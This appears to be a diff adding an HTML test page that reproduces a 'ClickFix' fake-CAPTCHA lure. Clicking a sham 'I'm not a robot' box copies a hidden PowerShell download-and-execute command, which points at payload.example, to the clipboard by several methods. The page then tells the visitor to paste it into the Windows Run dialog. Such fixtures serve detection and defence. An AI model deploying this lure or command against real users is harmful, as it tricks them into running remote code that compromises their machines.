@@ -1,0 +1,69 @@
+<!doctype html>
+<html lang="en">
+<head><meta charset="utf-8"><title>Just a moment...</title>
+<style>
+  body{font-family:sans-serif;background:#f4f4f4;color:#222;margin:0}
+  .overlay{position:fixed;inset:0;background:rgba(0,0,0,.5);display:flex;align-items:center;justify-content:center}
+  .box{background:#fff;padding:24px 28px;border-radius:6px;width:340px}
+  .check{display:flex;gap:10px;align-items:center;border:1px solid #ccc;padding:14px;cursor:pointer}
+  #steps{display:none;margin-top:16px;font-size:14px}
+  kbd{border:1px solid #999;border-radius:3px;padding:1px 5px}
+</style>
+</head>
+<body>
+  <!-- ClickFix lure: the checkbox copies a command, then the "verification
+       steps" tell the visitor to run it. The command here points at a
+       reserved .example host and is never executed by the test.
+       ?mode=exec copies through a hidden textarea + execCommand,
+       ?mode=setdata through a copy-event handler, ?long=1 puts the lure on
+       top of a long article, as on a hacked site. -->
+  <main id="article"></main>
+  <div class="overlay">
+    <div class="box">
+      <h2>Verify you are human</h2>
+      <p>Complete the action below to continue.</p>
+      <div class="check" id="robot-check"><input type="checkbox" id="cb"> <span>I'm not a robot</span> <small>reCAPTCHA</small></div>
+      <div id="steps">
+        <p><b>Verification steps</b></p>
+        <ol>
+          <li>Press <kbd>Windows</kbd> + <kbd>R</kbd></li>
+          <li>Press <kbd>CTRL</kbd> + <kbd>V</kbd></li>
+          <li>Press <kbd>Enter</kbd></li>
+        </ol>
+      </div>
+    </div>
+  </div>
+<script>
+  const params = new URLSearchParams(location.search);
+  if (params.get("long")) {
+    document.getElementById("article").innerHTML =
+      "<h1>Ten easy weeknight recipes</h1>" + "<p>Slice the onions thinly and cook them slowly in butter until golden. </p>".repeat(120);
+  }
+  const cmd = 'powershell -w h -nop -c "iwr https://payload.example/v.ps1 | iex"' +
+    (params.get("decoy") === "0" ? "" : " # I am not a robot - reCAPTCHA Verification ID: 4823");
+  function copy() {
+    const mode = params.get("mode");
+    if (mode === "exec") {
+      const ta = document.createElement("textarea");
+      ta.value = cmd;
+      ta.style.position = "fixed"; ta.style.opacity = "0";
+      document.body.appendChild(ta);
+      ta.select();
+      document.execCommand("copy");
+      ta.remove();
+    } else if (mode === "setdata") {
+      const h = (e) => { e.clipboardData.setData("text/plain", cmd); e.preventDefault(); };
+      document.addEventListener("copy", h, { once: true });
+      document.execCommand("copy");
+    } else {
+      navigator.clipboard.writeText(cmd).catch(() => {});
+    }
+  }
+  document.getElementById("robot-check").addEventListener("click", () => {
+    document.getElementById("cb").checked = true;
+    copy();
+    setTimeout(() => { document.getElementById("steps").style.display = "block"; }, 300);
+  });
+</script>
+</body>
+</html>
